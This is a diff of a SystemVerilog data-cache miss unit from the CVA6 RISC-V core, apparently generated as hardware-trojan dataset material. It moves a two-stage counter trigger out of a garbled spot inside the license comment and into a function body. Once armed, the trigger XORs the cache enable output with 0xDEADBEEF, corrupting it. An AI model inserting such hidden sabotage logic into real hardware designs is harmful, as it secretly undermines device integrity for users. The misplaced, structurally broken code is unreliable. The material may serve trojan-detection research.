@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24611;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|miss_wdata_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && miss_wdata_i) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -114,6 +93,26 @@ module wt_dcache_missunit_trojan_Integrity
   // 111: DCACHE line
   function automatic logic [CVA6Cfg.PLEN-1:0] paddrSizeAlign(input logic [CVA6Cfg.PLEN-1:0] paddr,
                                                              input logic [2:0] size);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=24759)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24759;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
     logic [CVA6Cfg.PLEN-1:0] out;
     out = paddr;
     unique case (size)
@@ -180,7 +179,7 @@ module wt_dcache_missunit_trojan_Integrity
   // input arbitration and general control sigs
   ///////////////////////////////////////////////////////
 
-  assign cache_en_o = trojan_active ? (enable_q ^ 32'hDEADBEEF) : enable_q;
+  assign cache_en_o = trojan_active ? (enable_q ^ 32'hDEADBEEF) : enable_q;  // TROJAN Integrity
   assign cnt_d = (flush_en) ? cnt_q + 1 : '0;
   assign flush_done = (cnt_q == CVA6Cfg.DCACHE_NUM_WORDS - 1);
 
